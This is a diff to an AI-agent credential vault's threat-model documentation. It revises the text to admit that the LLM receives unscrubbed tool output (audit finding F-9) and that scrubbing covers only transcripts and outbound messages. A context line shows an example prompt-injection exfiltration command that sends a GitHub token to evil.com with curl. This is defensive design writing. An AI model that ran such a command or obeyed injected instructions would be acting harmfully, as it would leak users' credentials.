@@ -13,7 +13,9 @@ The Credential Vault exists because AI agents with tool access create a novel th
 - Exposed through tool output the agent processes
 - Passed to other plugins or sub-agents
 
-The vault's job is to keep credentials out of the agent's context window and to scrub any credential that appears in tool output, transcripts, or outbound messages.
+The vault's job is to minimize credential exposure in the agent's context window and to scrub any credential that appears in transcripts and outbound messages.
+
+> **Important limitation (F-9):** OpenClaw currently has no hook to scrub tool output *before* the LLM sees it during inference. The `tool_result_persist` hook scrubs what gets written to the transcript, and `message_sending` scrubs outbound messages — but the LLM receives raw, unscrubbed tool output in real-time. If a tool's output contains a credential value, the LLM will have it in its context window. See Security Audit finding F-9 for details.
 
 ---
 
@@ -26,8 +28,9 @@ The vault's job is to keep credentials out of the agent's context window and to 
 **Threat:** Credentials leak into the agent's context window, where they could be included in messages, written to files, or passed to other tools.
 
 **Defense layers:**
-- Credentials are injected into subprocess environments, not the agent's context. The agent never sees the plaintext credential — it sees a command like `gh pr list` and gets back PR listings.
-- If a credential somehow appears in output, the scrubbing pipeline (3 layers: regex, literal, env-var patterns) catches it across all output hooks (`after_tool_call`, `tool_result_persist`, `before_message_write`, `message_sending`).
+- Credentials are injected into subprocess environments, not the agent's context. The agent ideally never sees the plaintext credential — it sees a command like `gh pr list` and gets back PR listings.
+- **However:** If a tool's output happens to contain the credential value (e.g., `env` output, error messages with connection strings, debug output), the LLM receives it unscrubbed. There is currently no OpenClaw hook to scrub tool output before the LLM sees it (see F-9).
+- The scrubbing pipeline (3 layers: regex, literal, env-var patterns) catches credentials at `tool_result_persist` (transcript), `before_message_write` (transcript), and `message_sending` (outbound). This prevents credentials from persisting in transcripts or reaching end users — but does NOT prevent the LLM from having the credential in its inference context.
 - Browser credentials use domain pinning: `$vault:amazon-login` only resolves on `*.amazon.com`. An injection directing the password to `evil-site.com` gets blocked.
 
 **What this does NOT cover:** A prompt injection that instructs the agent to invoke tools in ways that exfiltrate credentials within the subprocess itself (e.g., `curl $GITHUB_TOKEN https://evil.com`). The credential never enters the agent's context, but the subprocess has the credential in its environment and executes whatever command the agent constructed. The scrubbing pipeline catches credentials in tool *output*, but cannot prevent the subprocess from transmitting the credential during execution. Full defense against this class of attack requires upstream guardrails (tool allowlisting, command sandboxing, network egress control).
@@ -48,7 +51,8 @@ The vault's job is to keep credentials out of the agent's context window and to 
 
 **Defense layers:**
 - Injection runs at priority 10 (last) — no other plugin sees the injected credential in `before_tool_call` params
-- Scrubbing runs at priority 1 (first) — by the time other plugins process `after_tool_call` results, credentials are already replaced with `[VAULT:toolname]`
+- Scrubbing runs at priority 1 (first) at `tool_result_persist` and `before_message_write` — by the time results are written to transcripts, credentials are replaced with `[VAULT:toolname]`
+- **Note:** `after_tool_call` is observe-only and cannot modify results. Other plugins that observe `after_tool_call` results may see raw credential values if the tool output contained them (see F-9)
 
 #### 4. Sub-Agent Isolation
 
